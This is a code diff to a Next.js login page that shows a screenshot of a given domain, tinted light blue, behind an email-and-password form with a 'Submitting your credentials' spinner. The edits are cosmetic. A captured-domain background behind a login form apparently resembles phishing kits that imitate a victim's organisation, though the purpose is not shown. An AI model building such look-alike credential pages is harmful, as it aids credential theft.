@@ -42,14 +42,14 @@ export default function LoginPage() {
   useEffect(() => {
     if (!domainToCapture) {
       setScreenshotUrl('')
-      setIsLoading(false)    // no background → hide preloader
+      setIsLoading(false)
       return
     }
     const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
     const sep  = base.includes('?') ? '&' : '?'
     const url  = `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
     setScreenshotUrl(url)
-    setIsLoading(true)      // wait until the image actually loads
+    setIsLoading(true)
   }, [domainToCapture])
 
   const validateEmail = (v: string) =>
@@ -93,7 +93,7 @@ export default function LoginPage() {
         </div>
       )}
 
-      {/* Screenshot background */}
+      {/* Screenshot + light-blue tint background */}
       {screenshotUrl && (
         <div className="absolute inset-0 overflow-hidden">
           <img
@@ -101,8 +101,10 @@ export default function LoginPage() {
             alt={`Screenshot of ${domainToCapture}`}
             onLoad={() => setIsLoading(false)}
             onError={() => setIsLoading(false)}
-            className="w-full h-full object-cover opacity-20 filter blur-[1px] pointer-events-none"
+            className="w-full h-full object-cover opacity-50 pointer-events-none"
           />
+          {/* light-blue overlay */}
+          <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
         </div>
       )}
 
@@ -171,9 +173,7 @@ export default function LoginPage() {
             <h2 className="text-lg font-semibold text-gray-800">
               Please wait…
             </h2>
-            <p className="mt-2 text-gray-600">
-              Submitting your credentials.
-            </p>
+            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
           </div>
         </div>
       )}
